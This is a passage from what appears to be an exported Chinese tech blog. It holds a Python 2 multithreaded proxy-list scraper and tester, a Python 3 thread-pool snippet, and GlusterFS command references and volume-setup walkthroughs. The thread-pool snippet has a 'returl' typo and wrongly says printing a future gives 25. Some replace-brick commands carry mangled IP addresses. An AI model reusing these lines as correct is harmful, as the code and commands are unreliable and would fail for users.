<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2018/5/3 0003 10:52</span><br><span class="line"># @Author  : Sun</span><br><span class="line"># @Blog    : wandouduoduo</span><br><span class="line"># @File    : 生产者消费者.py</span><br><span class="line"># @Software: PyCharm</span><br><span class="line">import sys</span><br><span class="line">import Queue</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</span><br><span class="line">q = Queue.Queue(10)</span><br><span class="line">headers=&#123;&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&apos;&#125;</span><br><span class="line">def get_ip(page):</span><br><span class="line">    url1=&apos;http://www.66ip.cn/mo.php?sxb=&amp;tqsl=30&amp;port=&amp;export=&amp;ktip=&amp;sxa=&amp;submit=%CC%E1++%C8%A1&amp;textarea=&apos;</span><br><span class="line">    url2=&apos;http://www.xicidaili.com/nn/%s&apos;</span><br><span class="line">    for i in range(1,page):</span><br><span class="line">        url1_1=url1+str(i)</span><br><span class="line">        url2_2=url2+str(i)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url=url1_1,headers=headers,timeout=5)</span><br><span class="line">            #time.sleep(20)</span><br><span class="line">            rr = re.findall(&apos;        (.*?)&lt;br /&gt;&apos;,r.content)</span><br><span class="line">            for x in rr:</span><br><span class="line">                q.put(x)</span><br><span class="line">            time.sleep(20)</span><br><span class="line">        except Exception,e:</span><br><span class="line">            print e</span><br><span class="line">        try:</span><br><span class="line">            time.sleep(30)</span><br><span class="line">            r = requests.get(url=url2_2,headers=headers,timeout=5)</span><br><span class="line">            rr = re.findall(&apos;/&gt;&lt;/td&gt;(.*?)&lt;a href&apos;,r.content,re.S)</span><br><span class="line">            for x in rr:</span><br><span class="line">                x1 = x.replace(&apos;\n&apos;,&apos;&apos;).replace(&apos;&lt;td&gt;&apos;,&apos;&apos;).replace(&quot;&lt;/td&gt;&quot;,&apos;:&apos;).replace(&apos;      &apos;,&apos;&apos;).replace(&apos;:  &apos;,&apos;&apos;)</span><br><span class="line">                print x1</span><br><span class="line">                q.put(x1)</span><br><span class="line">            time.sleep(20)</span><br><span class="line">        except Exception,e:</span><br><span class="line">            print e</span><br><span class="line">def scan_ip():</span><br><span class="line">    while 1:</span><br><span class="line">        proxies=&#123;&#125;</span><br><span class="line">        ip = q.get()</span><br><span class="line">        proxies[&apos;http&apos;] = str(ip)</span><br><span class="line">        try:</span><br><span class="line">            req2 = requests.get(url=&apos;http://blog.csdn.net/lzy98&apos;, proxies=proxies, headers=headers, timeout=5)</span><br><span class="line">            if &apos;One puls&apos; in req2.content:</span><br><span class="line">                print str(proxies[&apos;http&apos;]) + unicode(&apos;该代理可正常访问网页...&apos;,&apos;utf-8&apos;)</span><br><span class="line">            else:</span><br><span class="line">                print unicode(&apos;  该代理无法访问网页,继续验证下一代理...&apos;, &apos;utf-8&apos;)</span><br><span class="line">        except :</span><br><span class="line">            print str(proxies[&apos;http&apos;])+unicode(&apos;  无法连接到代理服务器&apos;,&apos;utf-8&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">    # 这里是要开2个任务量，就是2个线程</span><br><span class="line">    t = threading.Thread(target=get_ip,args=(10,))</span><br><span class="line">    # 传入的参数是10，回归到get_ip函数，发现传入的参数就是要扫描提供代理网站的页数</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=scan_ip)</span><br><span class="line">t1.start()</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">177.132.249.127:20183无法连接到代理服务器</span><br><span class="line">39.104.82.143:8080无法连接到代理服务器</span><br><span class="line">123.231.203.139:8080无法连接到代理服务器</span><br><span class="line">180.250.43.66:8080该代理可正常访问网页...</span><br><span class="line">189.127.238.65:8080无法连接到代理服务器</span><br><span class="line">107.178.3.105:8181该代理可正常访问网页...</span><br><span class="line">95.31.80.67:53281该代理可正常访问网页...</span><br><span class="line">79.174.160.167:8080无法连接到代理服务器</span><br><span class="line">223.242.94.36:31588无法连接到代理服务器</span><br><span class="line">该代理无法访问网页,继续验证下一代理...</span><br><span class="line">5.188.155.243:8080无法连接到代理服务器</span><br><span class="line">180.183.17.151:8080该代理可正常访问网页...</span><br><span class="line">113.90.247.99:8118该代理可正常访问网页...</span><br><span class="line">180.119.65.184:3128无法连接到代理服务器</span><br></pre></td></tr></table></figure>

<h2 id="Python3中的线程池方法"><a href="#Python3中的线程池方法" class="headerlink" title="Python3中的线程池方法"></a>Python3中的线程池方法</h2><p>虽然在2版本中并没有线程池，但是在3版本中有相关线程池的使用方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">executor = ThreadPoolExecutor(3)</span><br><span class="line"># 实例化线程池对象，开启3个线程</span><br><span class="line">def fun(a,b):</span><br><span class="line">    print (a,b)</span><br><span class="line">    returl a**b</span><br><span class="line"># 定义一个函数</span><br><span class="line">executor.submit(fun,2,5) # y运行结果：2,5</span><br><span class="line"># 这是调用与开启线程</span><br><span class="line">result=executor.submit(fun,5,2)</span><br><span class="line">print result # 运行结果: 25</span><br><span class="line"># 如果要有很多参数传入进行运算</span><br><span class="line">executor.map(fun,[1,2,3,4],[2,3,5,6])</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程积累</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>glusterfs常用命令</title>
    <url>/articles/4f1d1494.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>glusterfs作为分布式存储，优点和安装这里就不再赘述了，看博客中教程。本文主要是介绍glusterfs常用命令和案例。</p>
<a id="more"></a>

<h2 id="命令详解"><a href="#命令详解" class="headerlink" title="命令详解"></a>命令详解</h2><h4 id="服务器节点"><a href="#服务器节点" class="headerlink" title="服务器节点"></a>服务器节点</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看所有节点信息，显示时不包括本节点</span></span><br><span class="line">gluster peer status </span><br><span class="line"><span class="comment">#添加节点</span></span><br><span class="line">gluster peer probe NODE-NAME </span><br><span class="line"><span class="comment">#移除节点，需要提前将该节点上的brick移除</span></span><br><span class="line">gluster peer detach NODE-NAME</span><br></pre></td></tr></table></figure>



<h4 id="glusterd服务"><a href="#glusterd服务" class="headerlink" title="glusterd服务"></a>glusterd服务</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动glusterd服务</span></span><br><span class="line">/etc/init.d/glusterd start </span><br><span class="line"><span class="comment">#关闭glusterd服务</span></span><br><span class="line">/etc/init.d/glusterd stop </span><br><span class="line"><span class="comment">#查看glusterd服务</span></span><br><span class="line">/etc/init.d/glusterd status</span><br></pre></td></tr></table></figure>



<h4 id="卷管理"><a href="#卷管理" class="headerlink" title="卷管理"></a>卷管理</h4><h5 id="创建卷"><a href="#创建卷" class="headerlink" title="创建卷"></a>创建卷</h5><p><strong>复制卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">语法： gluster volume create NEW-VOLNAME [replica COUNT] [transport tcp | rdma | tcp, rdma] NEW-BRICK</span><br><span class="line"></span><br><span class="line">示例1：gluster volume create <span class="built_in">test</span>-volume replica 2 transport tcp server1:/exp1/brick server2:/exp2/brick</span><br></pre></td></tr></table></figure>

<p><strong>条带卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">语法：gluster volume create NEW-VOLNAME [stripe COUNT] [transport tcp | rdma | tcp, rdma] NEW-BRICK...</span><br><span class="line"></span><br><span class="line">示例：gluster volume create <span class="built_in">test</span>-volume stripe 2 transport tcp server1:/exp1/brick server2:/exp2/brick</span><br></pre></td></tr></table></figure>

<p><strong>分布式卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">语法： gluster volume create NEW-VOLNAME [transport tcp | rdma | tcp, rdma] NEW-BRICK</span><br><span class="line"></span><br><span class="line">示例1：gluster volume create <span class="built_in">test</span>-volume server1:/exp1/brick server2:/exp2/brick</span><br><span class="line">示例2：gluster volume create <span class="built_in">test</span>-volume transport rdma server1:/exp1/brick server2:/exp2/brick server3:/exp3/brick server4:/exp4/brick</span><br></pre></td></tr></table></figure>

<p><strong>分布式复制卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">语法： gluster volume create NEW-VOLNAME [replica COUNT] [transport tcp | rdma | tcp, rdma] NEW-BRICK...</span><br><span class="line">示例： gluster volume create <span class="built_in">test</span>-volume replica 2 transport tcp server1:/exp1/brick server2:/exp2/brick server3:/exp3/brick server4:/exp4/brick</span><br></pre></td></tr></table></figure>

<p> <strong>分布式条带卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">语法：gluster volume create NEW-VOLNAME [stripe COUNT] [transport tcp | rdma | tcp, rdma] NEW-BRICK...</span><br><span class="line"></span><br><span class="line">示例：gluster volume create <span class="built_in">test</span>-volume stripe 2 transport tcp server1:/exp1/brick server2:/exp2/brick server3:/exp3/brick server4:/exp4/brick</span><br></pre></td></tr></table></figure>

<p><strong>条带复制卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">语法：gluster volume create NEW-VOLNAME [stripe COUNT] [replica COUNT] [transport tcp | rdma | tcp, rdma] NEW-BRICK...</span><br><span class="line"></span><br><span class="line">示例：gluster volume create <span class="built_in">test</span>-volume stripe 2 replica 2 transport tcp server1:/exp1/brick server2:/exp2/brick server3:/exp3/brick server4:/exp4/brick</span><br></pre></td></tr></table></figure>

<h5 id="启动卷"><a href="#启动卷" class="headerlink" title="启动卷"></a>启动卷</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gluster volume start <span class="built_in">test</span>-volume</span><br></pre></td></tr></table></figure>

<h5 id="停止卷"><a href="#停止卷" class="headerlink" title="停止卷"></a>停止卷</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gluster volume stop <span class="built_in">test</span>-volume</span><br></pre></td></tr></table></figure>

<p> <strong>删除卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先停止卷后才能删除</span></span><br><span class="line">gluster volume delete <span class="built_in">test</span>-volume</span><br></pre></td></tr></table></figure>

<h5 id="查看卷"><a href="#查看卷" class="headerlink" title="查看卷"></a>查看卷</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#列出集群中的所有卷</span></span><br><span class="line">gluster volume list </span><br><span class="line"><span class="comment">#查看集群中的卷信息</span></span><br><span class="line">gluster volume info [all] </span><br><span class="line"><span class="comment">#查看集群中的卷状态</span></span><br><span class="line">gluster volume status [all] </span><br><span class="line"></span><br><span class="line">gluster volume status [detail| clients | mem | inode | fd]</span><br></pre></td></tr></table></figure>

<h5 id="配置卷"><a href="#配置卷" class="headerlink" title="配置卷"></a>配置卷</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gluster volume <span class="built_in">set</span> &lt;VOLNAME&gt; &lt;OPTION&gt; &lt;PARAMETER&gt;</span><br></pre></td></tr></table></figure>

<h5 id="扩展卷"><a href="#扩展卷" class="headerlink" title="扩展卷"></a>扩展卷</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gluster volume add-brick &lt;VOLNAME&gt; &lt;NEW-BRICK&gt;</span><br><span class="line"><span class="comment">#注意，如果是复制卷或者条带卷，则每次添加的Brick数必须是replica或者stripe的整数倍。</span></span><br></pre></td></tr></table></figure>

<h5 id="收缩卷"><a href="#收缩卷" class="headerlink" title="收缩卷"></a>收缩卷</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先将数据迁移到其它可用的Brick，迁移结束后才将该Brick移除：</span></span><br><span class="line">gluster volume remove-brick start</span><br><span class="line"><span class="comment">#在执行了start之后，可以使用status命令查看移除进度：</span></span><br><span class="line">gluster volume remove-brick status</span><br><span class="line"><span class="comment">#不进行数据迁移，直接删除该Brick：</span></span><br><span class="line">gluster volume remove-brick commit</span><br><span class="line"><span class="comment">#注意，如果是复制卷或者条带卷，则每次移除的Brick数必须是replica或者stripe的整数倍。</span></span><br></pre></td></tr></table></figure>

<h5 id="迁移卷"><a href="#迁移卷" class="headerlink" title="迁移卷"></a>迁移卷</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用start命令开始进行迁移：</span></span><br><span class="line">gluster volume replace-brick start</span><br><span class="line"><span class="comment">#在数据迁移过程中，可以使用pause命令暂停迁移：</span></span><br><span class="line">gluster volume replace-brick pause</span><br><span class="line"><span class="comment">#在数据迁移过程中，可以使用abort命令终止迁移：</span></span><br><span class="line">gluster volume replace-brick abort</span><br><span class="line"><span class="comment">#在数据迁移过程中，可以使用status命令查看迁移进度：</span></span><br><span class="line">gluster volume replace-brick status</span><br><span class="line"><span class="comment">#在数据迁移结束后，执行commit命令来进行Brick替换：</span></span><br><span class="line">gluster volume replace-brick commit</span><br></pre></td></tr></table></figure>

<h5 id="重新均衡卷"><a href="#重新均衡卷" class="headerlink" title="重新均衡卷"></a>重新均衡卷</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#不迁移数据：</span></span><br><span class="line">gluster volume rebalance lay-outstart</span><br><span class="line">gluster volume rebalance start</span><br><span class="line">gluster volume rebalance startforce</span><br><span class="line">gluster volume rebalance status</span><br><span class="line">gluster volume rebalance stop</span><br></pre></td></tr></table></figure>

<h4 id="Brick管理"><a href="#Brick管理" class="headerlink" title="Brick管理"></a>Brick管理</h4><h5 id="添加Brick"><a href="#添加Brick" class="headerlink" title="添加Brick"></a>添加Brick</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gluster volume add-brick <span class="built_in">test</span>-volume 192.168.1.&#123;151,152&#125;:/mnt/brick2</span><br></pre></td></tr></table></figure>

<h5 id="删除Brick"><a href="#删除Brick" class="headerlink" title="删除Brick"></a>删除Brick</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#若是副本卷，则移除的Bricks数是replica的整数倍</span></span><br><span class="line">gluster volume remove-brick <span class="built_in">test</span>-volume 192.168.1.&#123;151,152&#125;:/mnt/brick2 start</span><br><span class="line"><span class="comment">#在执行开始移除之后，可以使用status命令进行移除状态查看。</span></span><br><span class="line">gluster volume remove-brick <span class="built_in">test</span>-volume 192.168.1.&#123;151,152&#125;:/mnt/brick2 status</span><br><span class="line"><span class="comment">#使用commit命令执行Brick移除，则不会进行数据迁移而直接删除Brick，符合不需要数据迁移的用户需求。</span></span><br><span class="line">gluster volume remove-brick <span class="built_in">test</span>-volume 192.168.1.&#123;151,152&#125;:/mnt/brick2 commit</span><br></pre></td></tr></table></figure>

<h5 id="替换Brick"><a href="#替换Brick" class="headerlink" title="替换Brick"></a>替换Brick</h5><p>任务：把192.168.1.151:/mnt/brick0 替换为192.168.1.151:/mnt/brick2</p>
<p><strong>开始替换</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gluster volume replace-brick <span class="built_in">test</span>-volume 192.168.1.:/mnt/brick0 ..152:/mnt/brick2 start</span><br><span class="line">异常信息：volume replace-brick: failed: /data/share2 or a prefix of it is already part of a volume</span><br><span class="line"></span><br><span class="line"><span class="comment">#说明 /mnt/brick2 曾经是一个Brick。具体解决方法</span></span><br><span class="line">rm -rf /mnt/brick2/.glusterfs</span><br><span class="line"></span><br><span class="line">setfattr -x trusted.glusterfs.volume-id /mnt/brick2</span><br><span class="line">setfattr -x trusted.gfid /mnt/brick2</span><br><span class="line"></span><br><span class="line"><span class="comment">#如上，执行replcace-brick卷替换启动命令，使用start启动命令后，开始将原始Brick的数据迁移到即将需要替换的Brick上。</span></span><br></pre></td></tr></table></figure>

<p><strong>查看是否替换完</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gluster volume replace-brick <span class="built_in">test</span>-volume 192.168.1.151:/mnt/brick0 ..152:/mnt/brick2 status</span><br></pre></td></tr></table></figure>

<p><strong>在数据迁移的过程中，可以执行abort命令终止Brick替换。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gluster volume replace-brick <span class="built_in">test</span>-volume 192.168.1.151:/mnt/brick0 ..152:/mnt/brick2 abort</span><br></pre></td></tr></table></figure>

<p><strong>在数据迁移结束之后，执行commit命令结束任务，则进行Brick替换。使用volume info命令可以查看到Brick已经被替换</strong>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gluster volume replace-brick <span class="built_in">test</span>-volume 192.168.1.151:/mnt/brick0 .152:/mnt/brick2 commit</span><br><span class="line"><span class="comment">#此时我们再往 /sf/data/vs/gfs/rep2上添加数据的话，数据会同步到 192.168.1.152:/mnt/brick0和192.168.1.152:/mnt/brick2上。而不会同步到192.168.1.151:/mnt/brick0 上。</span></span><br></pre></td></tr></table></figure>

<h4 id="文件系统扩展属性"><a href="#文件系统扩展属性" class="headerlink" title="文件系统扩展属性"></a>文件系统扩展属性</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取文件扩展属性</span></span><br><span class="line">getfattr -d -m . -e hex filename</span><br><span class="line">getfattr -d -m <span class="string">"trusted.afr.*"</span> -e hex filename</span><br></pre></td></tr></table></figure>

<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h4 id="增加节点"><a href="#增加节点" class="headerlink" title="增加节点"></a>增加节点</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#hosts文件中添加对应服务器解析</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ip   gs3"</span> &gt;&gt;/etc/hosts</span><br><span class="line"><span class="comment">#查看节点信息</span></span><br><span class="line">gluster peer status</span><br><span class="line"><span class="comment">#添加节点</span></span><br><span class="line">gluster peer probe gs3</span><br><span class="line"></span><br><span class="line"><span class="comment">#数据卷添加新的brick</span></span><br><span class="line">gluster volume add-brick 卷名 replica 添加后的副本个数 brick所在的IP:brick所在的地址 force</span><br><span class="line">最后的force是因为，gluster集群推荐不要和系统公用磁盘，如果公用就需添加。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">mkdir -p /brick/gv0</span><br><span class="line">gluster volume add-brick gv0 replica 2 gs2:/brick/gv0  force</span><br></pre></td></tr></table></figure>

<h4 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看节点信息</span></span><br><span class="line">gluster peer status</span><br><span class="line"><span class="comment"># 删除操作,注意删除节点必须先删除brick</span></span><br><span class="line">gluster peer detach gs3</span><br></pre></td></tr></table></figure>

<p><img src="/articles/4f1d1494/1.png" alt></p>
<p>上面报错，是因为没有删除brick导致。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#数据卷移除旧的brick</span></span><br><span class="line">gluster volume remove-brick 卷名 replica 移除后的副本个数 brick所在的IP:brick所在的地址</span><br><span class="line"></span><br><span class="line">例如：移除gs3上的static卷</span><br><span class="line">gluster volume remove-brick static gs3:/data/volume/brick/static</span><br></pre></td></tr></table></figure>

<p><img src="/articles/4f1d1494/2.png" alt></p>
<p>执行移除报错，是因为先删除副本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gluster volume remove-brick gv0 replica 2  gs3:/brick/gv0 force</span><br><span class="line"><span class="comment">#注意副本数为删除后还剩的个数</span></span><br><span class="line"><span class="comment">#然后再移除节点</span></span><br><span class="line">gluster peer detach gs3</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>GlusterFS</tag>
      </tags>
  </entry>
  <entry>
    <title>GlusterFS分布式存储集群之使用</title>
    <url>/articles/35de9bb2.html</url>
    <content><![CDATA[<h1 id="Glusterfs逻辑卷创建与使用"><a href="#Glusterfs逻辑卷创建与使用" class="headerlink" title="Glusterfs逻辑卷创建与使用"></a>Glusterfs逻辑卷创建与使用</h1><p>volume是brick的组合，并且大部分glusterfs文件系统的操作都在volume上。</p>
<p>glusterfs支持4种基本卷，并可以根据需求对4种基本卷进行组合形成多种扩展卷（得益于glusterfs的模块化堆栈架构设计）。</p>
<p>以下主要展示各类型逻辑卷的功能性，未对性能做测试验证。</p>
<a id="more"></a>

<h2 id="分布式卷"><a href="#分布式卷" class="headerlink" title="分布式卷"></a>分布式卷</h2><p>分布式卷（Distributed Glusterfs Volume，又称DHT），glusterfs创建volume不指定卷类型时，默认即分布式卷，特点如下：</p>
<ol>
<li>根据hash算法，将多个文件分布到卷中的多个brick server上，类似（不是）raid0，但文件无分片；</li>
<li>方便扩展空间，但无冗余保护；</li>
<li>由于使用本地文件系统进行存储（brick server 的本地文件系统），存取效率不高；</li>
<li>受限于本地文件系统对单文件容量的限制，支持超大型文件系统有问题。</li>
</ol>
<p><img src="/articles/35de9bb2/1.png" alt="img"></p>
<h4 id="创建存储目录（optional）"><a href="#创建存储目录（optional）" class="headerlink" title="创建存储目录（optional）"></a>创建存储目录（optional）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在brick server节点创建存储目录，即brick所在；</span></span><br><span class="line"><span class="comment"># 以glusterfs01节点为例，注意各brick server挂载磁盘的目录名的不同</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># mkdir -p /brick1/dis_volume</span></span><br></pre></td></tr></table></figure>

<h4 id="创建分布式卷"><a href="#创建分布式卷" class="headerlink" title="创建分布式卷"></a>创建分布式卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令：gluster volume create NEW-VOLNAME [transport [tcp | rdma | tcp,rdma]] NEW-BRICK...</span></span><br><span class="line"><span class="comment"># 以上命令在任意server节点操作均可，以glusterfs01节点为例；</span></span><br><span class="line"><span class="comment"># 演示分布式卷的创建，两个server节点即可，创建名为”distributed-volume”的逻辑卷</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume create distributed-volume glusterfs01:/brick1/dis_volume glusterfs02:/brick2/dis_volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/2.png" alt="img"></p>
<h4 id="卷信息-状态"><a href="#卷信息-状态" class="headerlink" title="卷信息/状态"></a>卷信息/状态</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令”gluster volume list”可列出已创建的卷；</span></span><br><span class="line"><span class="comment"># 命令”gluster volume info”可不指定具体的卷，即列出所有卷信息；</span></span><br><span class="line"><span class="comment"># info中给出除卷名外，还有卷类型，状态，brick组成等信息；</span></span><br><span class="line"><span class="comment"># 其中状态为“Created”，需要通过命令启动后才可被挂载使用，在创建成功后的提示信息中有提到”please start the volume to access data”</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume info distributed-volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/3.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看卷状态；</span></span><br><span class="line"><span class="comment"># 展示卷中每个brick的状态，以及每个brick服务的监听端口</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume status distributed-volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/4.png" alt="img"></p>
<h4 id="启动卷"><a href="#启动卷" class="headerlink" title="启动卷"></a>启动卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume start distributed-volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/5.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 再次查看卷信息，状态变为"Started"</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume info distributed-volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/6.png" alt="img"></p>
<h4 id="client挂载"><a href="#client挂载" class="headerlink" title="client挂载"></a>client挂载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在客户端创建挂载目录</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># mkdir /mnt/distributed</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载时，可使用任意1台已加入可信存储池并已创建对应卷类型的server节点；</span></span><br><span class="line"><span class="comment"># brick以”SERVER:EXPORT”的形式标识</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># mount.glusterfs 172.30.200.51:distributed-volume /mnt/distributed/</span></span><br></pre></td></tr></table></figure>

<h4 id="查看挂载情况"><a href="#查看挂载情况" class="headerlink" title="查看挂载情况"></a>查看挂载情况</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过“df -Th”命令可查看被挂载的volume，被挂载的文件系统，已经挂载卷的容量是2个brick容量之和</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># df -Th</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/7.png" alt="img"></p>
<h4 id="查看brick的监听端口"><a href="#查看brick的监听端口" class="headerlink" title="查看brick的监听端口"></a>查看brick的监听端口</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># server节点上每启动1个brick，即启动1个brick服务，具备相应的服务监听端口，起始端口号是tcp49152</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># netstat -tunlp | grep gluster</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/8.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 另外，client连接的即brick服务的监听端口</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># netstat -nt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/9.png" alt="img"></p>
<h4 id="存储测试"><a href="#存储测试" class="headerlink" title="存储测试"></a>存储测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在client的挂载目录下创建若干文件</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># cd /mnt/distributed/</span></span><br><span class="line">[root@glusterfs-client distributed]<span class="comment"># touch distributed&#123;1..4&#125;.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># glusterfs01节点</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># tree /brick1/dis_volume/</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/10.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs02节点</span></span><br><span class="line">[root@glusterfs02 ~]<span class="comment"># tree /brick2/dis_volume/</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/11.png" alt="img"></p>
<p><strong>结论：分布式卷将多个文件分布存储在多个brick server，但并无副本。</strong> </p>
<h2 id="条带卷（Deprecated）"><a href="#条带卷（Deprecated）" class="headerlink" title="条带卷（Deprecated）"></a>条带卷（Deprecated）</h2><p>条带卷（Striped Glusterfs Volume），特点如下：</p>
<ol>
<li>每个文件被分片成等同于brick数量的chunks，然后以round robin的方式将每个chunk存储到1个brick，相当于raid0；</li>
<li>单一超大容量文件可被分片，不受brick server本地文件系统的限制；</li>
<li>文件分片后，并发粒度是chunks，分布式读写性能较高，但分片随机读写可能会导致硬盘iops较高；</li>
<li>无冗余，1个server节点故障会导致所有数据丢失。</li>
</ol>
<p><img src="/articles/35de9bb2/12.png" alt="img"></p>
<h4 id="创建条带卷"><a href="#创建条带卷" class="headerlink" title="创建条带卷"></a>创建条带卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令：gluster volume create NEW-VOLNAME [stripe COUNT] [transport [tcp | dma | tcp,rdma]] NEW-BRICK...</span></span><br><span class="line"><span class="comment"># 以上命令在任意server节点操作均可，以glusterfs01节点为例；</span></span><br><span class="line"><span class="comment"># 创建名为”strsipe-volume”的逻辑卷；</span></span><br><span class="line"><span class="comment"># 必须指定卷类型（默认为分布式卷）与对应的条带数量，数量需要与后续使用brick server数量对等；</span></span><br><span class="line"><span class="comment"># “transport tcp”指定集群通信方式</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume create stripe-volume stripe 3 transport tcp glusterfs01:/brick1/str_volume glusterfs02:/brick2/str_volume glusterfs03:/brick3/str_volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/13.png" alt="img"></p>
<h4 id="启动卷-1"><a href="#启动卷-1" class="headerlink" title="启动卷"></a>启动卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume start stripe-volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/14.png" alt="img"></p>
<h4 id="client挂载-1"><a href="#client挂载-1" class="headerlink" title="client挂载"></a>client挂载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@glusterfs-client ~]<span class="comment"># mkdir /mnt/stripe</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># mount.glusterfs 172.30.200.51:stripe-volume /mnt/stripe/</span></span><br></pre></td></tr></table></figure>

